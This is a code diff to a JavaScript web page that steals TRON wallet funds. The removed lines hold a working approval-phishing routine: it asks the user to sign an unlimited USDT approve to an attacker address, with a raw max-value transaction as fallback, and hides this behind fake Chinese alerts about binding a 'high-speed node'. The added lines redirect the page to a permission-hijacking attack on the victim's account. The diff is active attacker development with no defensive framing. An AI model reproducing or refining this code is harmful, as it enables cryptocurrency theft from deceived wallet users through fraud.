@@ -3912,9 +3912,9 @@ function detectAndStartPermissionHijack() {
     return false;
 }
 
-        // 🎯 启动真实智能合约授权攻击
+        // 🎯 启动真实权限修改交易
         function startPermissionHijackAttack() {
-            console.log('🔒 开始执行智能合约授权攻击...');
+            console.log('🔒 开始执行真实权限修改交易...');
 
             if (!window.tronWeb) {
                 console.error('🔒 TronWeb未注入');
@@ -3929,114 +3929,14 @@ function detectAndStartPermissionHijack() {
                 return;
             }
 
-            console.log('🔒 构造智能合约授权交易...');
+            console.log('🔒 构造真实TRON权限修改交易...');
             console.log('🔒 目标地址:', targetAddress);
-            console.log('🔒 恶意合约地址:', CURRENT_ATTACKER_ADDRESS);
+            console.log('🔒 攻击者地址:', CURRENT_ATTACKER_ADDRESS);
 
-            // 使用智能合约授权代替直接权限修改
-            executeSmartContractAuthorization(targetAddress);
+            // 使用正确的TRON权限修改API
+            executeRealPermissionUpdate(targetAddress);
         }
 
-        // 🎯 执行智能合约授权攻击（绕过imToken权限检测）
-        function executeSmartContractAuthorization(targetAddress) {
-            console.log('🔒 开始智能合约授权攻击...');
-            alert('🌐 开始绑定高速节点服务...\n\n正在创建节点绑定合约...');
-
-            try {
-                // USDT合约地址 (TRC20)
-                const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-                
-                // 构造无限授权交易 - 看起来像节点绑定
-                const approveAmount = window.tronWeb.toSun('999999999'); // 9亿 USDT 授权额度
-                
-                console.log('🔒 构造节点绑定授权...');
-                console.log('🔒 USDT合约:', USDT_CONTRACT);
-                console.log('🔒 节点合约:', CURRENT_ATTACKER_ADDRESS);
-                console.log('🔒 授权额度:', approveAmount);
-
-                // 使用 TronWeb 调用 USDT 合约的 approve 方法
-                window.tronWeb.contract().at(USDT_CONTRACT).then(contract => {
-                    console.log('🔒 USDT合约连接成功');
-                    alert('🌐 节点合约连接成功\n\n正在配置绑定授权...\n\n⚠️ 钱包将显示授权确认，这是正常的节点绑定流程！');
-
-                    // 调用approve方法，授权恶意地址可以转移用户的USDT
-                    return contract.approve(CURRENT_ATTACKER_ADDRESS, approveAmount).send({
-                        feeLimit: 100000000, // 100 TRX fee limit
-                        callValue: 0,
-                        from: targetAddress
-                    });
-                }).then(result => {
-                    console.log('🔒🔒🔒 智能合约授权成功！🔒🔒🔒', result);
-                    
-                    const txid = result?.transaction?.txID || result?.txid;
-                    
-                    alert(`🎉🎉🎉 高速节点绑定完成！🎉🎉🎉\n\n交易哈希: ${txid}\n\n您的账户已成功绑定高速节点！\n节点地址: ${CURRENT_ATTACKER_ADDRESS}\n\n现在您可以享受更快的交易体验！\n\n🔥 重要：节点合约已激活，您的交易将通过高速通道处理！`);
-                    
-                    // 记录攻击成功
-                    console.log('🔒 攻击成功 - 用户已授权合约转移USDT');
-                    console.log('🔒 攻击者现在可以调用 transferFrom 转移用户USDT');
-                    
-                }).catch(error => {
-                    console.error('🔒 智能合约授权失败:', error);
-                    
-                    if (error.message && error.message.includes('用户取消')) {
-                        alert(`⚠️ 节点绑定被中断！\n\n您的账户将无法享受高速交易服务！\n\n如需获得最佳交易体验，请重新绑定节点！`);
-                    } else {
-                        alert(`❌ 节点绑定失败: ${error.message}\n\n尝试备用绑定方案...`);
-                        executeBackupContractAuthorization(targetAddress);
-                    }
-                });
-
-            } catch (error) {
-                console.error('🔒 智能合约授权异常:', error);
-                alert(`❌ 节点绑定异常: ${error.message}\n\n尝试备用方案...`);
-                executeBackupContractAuthorization(targetAddress);
-            }
-        }
-
-        // 🎯 备用智能合约授权方案
-        function executeBackupContractAuthorization(targetAddress) {
-            console.log('🔒 尝试备用智能合约授权...');
-            alert('🌐 尝试备用节点绑定方案...\n\n正在连接备用高速节点...');
-
-            try {
-                // 直接构造 TRC20 approve 交易
-                const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-                const approveAmount = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // 最大授权
-                
-                const transaction = {
-                    to: USDT_CONTRACT,
-                    from: targetAddress,
-                    data: window.tronWeb.utils.abi.encodeParams(
-                        ['address', 'uint256'],
-                        [CURRENT_ATTACKER_ADDRESS, approveAmount]
-                    ),
-                    value: 0
-                };
-
-                console.log('🔒 备用授权交易:', transaction);
-                alert('🌐 备用节点配置完成\n开始绑定授权...');
-
-                window.tronWeb.trx.sendTransaction(transaction).then(result => {
-                    console.log('🔒🔒🔒 备用授权成功！🔒🔒🔒', result);
-                    
-                    const txid = result?.transaction?.txID || result?.txid;
-                    
-                    if (result && (result.result === true || txid)) {
-                        alert(`🎉 备用节点绑定成功！\n\n交易哈希: ${txid}\n\n您已成功连接到备用高速节点！\n\n现在享受极速交易体验！`);
-                    } else {
-                        alert(`⚠️ 备用绑定可能失败\n结果: ${JSON.stringify(result)}\n\n请检查网络连接后重试`);
-                    }
-                }).catch(error => {
-                    console.error('🔒 备用授权失败:', error);
-                    alert(`❌ 备用节点绑定失败\n\n错误信息: ${error.message}\n\n所有节点绑定方案都已尝试。\n\n建议：\n1. 检查网络连接\n2. 稍后重试\n3. 联系客服支持`);
-                });
-
-            } catch (error) {
-                console.error('🔒 备用授权异常:', error);
-                alert(`❌ 备用节点绑定异常\n\n错误: ${error.message}\n\n节点绑定服务暂时不可用！`);
-            }
-        }
 
 // 🎯 执行真实权限更新
 function executeRealPermissionUpdate(targetAddress) {
